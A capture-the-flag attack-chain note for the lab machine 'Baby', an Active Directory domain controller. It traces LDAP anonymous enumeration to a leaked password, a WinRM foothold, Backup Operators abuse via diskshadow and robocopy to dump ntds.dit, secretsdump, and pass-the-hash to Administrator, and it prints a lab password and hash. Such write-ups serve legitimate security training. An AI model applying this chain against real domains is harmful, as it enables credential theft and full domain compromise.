# Attack Chain - Baby

## Current Path
```
Nmap scan → Identified AD DC (baby.vl) → /etc/hosts config →
SMB null auth (restricted) → LDAP anonymous bind (8+2 users) →
Teresa.Bell description: "BabyStart123!" → SMB spray all LOGON_FAILURE (box broken) →
HTB machine reset → Caroline.Robinson STATUS_PASSWORD_MUST_CHANGE →
smbpasswd to Yourmoms123! → evil-winrm as caroline.robinson →
whoami /all → SeBackupPrivilege + SeRestorePrivilege (Backup Operators) →
reg save SAM + SYSTEM → download to kali → pypykatz (local admin hash only) →
diskshadow script (backup file, unix2dos) → upload + diskshadow /s backup →
shadow copy exposed as E: → robocopy /b E:\Windows\ntds . ntds.dit →
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL →
Administrator domain hash: ee4457ae59f1e3fbd764e33d9cef123d →
evil-winrm -H PtH as Administrator → root flag ✅
```

## Branch Points
- **After nmap:** Pure AD DC, no web services → SMB/LDAP enumeration
- **SMB null session:** Auth accepted but no data returned → tried LDAP next
- **LDAP anonymous bind:** Got users + Teresa.Bell password in description
- **Password spray failed (box broken):** All LOGON_FAILURE → HTB machine reset fixed it
- **Caroline.Robinson STATUS_PASSWORD_MUST_CHANGE:** Only user who hadn't changed initial password
- **SAM hash vs ntds.dit:** Local admin hash worked for evil-winrm but was LOCAL only, not domain admin. Needed ntds.dit for domain hashes.
- **robocopy z: failed:** Shadow copy was exposed as e: not z:. Also tried copy to SMB server with wrong share names (shared, loot vs share).
- **diskshadow interactive failed:** "The pipe has been ended" in evil-winrm. Script mode (/s) required.

## Key Findings
- `it` group → `Remote Management Users` (WinRM access)
- OUs: dev (5 users), it (5 users)
- Additional users from full dump: Ian.Walker, Caroline.Robinson
- Caroline.Robinson in Backup Operators group → SeBackupPrivilege, SeRestorePrivilege
- All domain hashes extracted from ntds.dit

## Next Steps
- [x] Add baby.vl to /etc/hosts
- [x] Test SMB null sessions
- [x] LDAP anonymous bind — users found
- [x] LDAP description reveals password
- [x] evil-winrm foothold as caroline.robinson
- [x] Enumerate privileges (whoami /all)
- [x] Get user flag
- [x] Identify privilege escalation path (Backup Operators)
- [x] Extract SAM + SYSTEM hives
- [x] Create diskshadow shadow copy
- [x] Robocopy ntds.dit from shadow
- [x] secretsdump.py to extract domain hashes
- [x] Pass-the-Hash as Administrator
- [x] Get root flag
